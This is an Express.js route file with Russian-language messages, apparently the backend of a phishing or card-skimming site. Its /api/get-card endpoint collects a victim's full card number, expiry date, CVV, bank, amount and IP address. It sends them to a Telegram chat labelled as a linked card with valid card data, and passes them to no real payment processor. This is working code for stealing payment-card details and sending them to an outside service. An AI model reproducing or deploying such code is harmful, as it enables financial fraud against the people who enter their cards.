import express from 'express';
const router = express.Router();
import { sendTelegramMessage } from '../utils/telegramSender';


router.post('/api/get-card', async (req, res) => {
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    if (Array.isArray(clientIP)) {
        clientIP = clientIP[0];
    } else if (!clientIP || clientIP === "") {
        clientIP = "IP неизвестен";
    }   
    
    const cardNumber = req.body.cardNumber;
    const cardDate = req.body.cardDate;
    const cardCVV = req.body.cardCVV;
    const totalPrice = req.body.totalPrice;
    const bank = req.body.bank;
    const paymentSystem = req.body.paymentSystem;

    const messageText = `
        <b>💳Привязана карта💳</b>\n\n💰 <strong>К оплате:</strong> <b>${totalPrice} ₽</b>\n\n🏦 <b>Банк: </b> <strong>${bank !== 'Your bank' ? bank : 'Неопределен'}</strong>\n🫙 <b>Система: </b> <strong>${paymentSystem}</strong>\n\n📂 <b>Данные карты:</b>\n▪️ <code>${cardNumber}</code>\n▪️ <code>${cardDate}</code> <b>|</b> <code>${cardCVV}</code>\n\n ✅ <b>Номер карты валидный</b>
    `;

    const result = await sendTelegramMessage(clientIP, messageText);
    res.json(result);
   
});


export default router;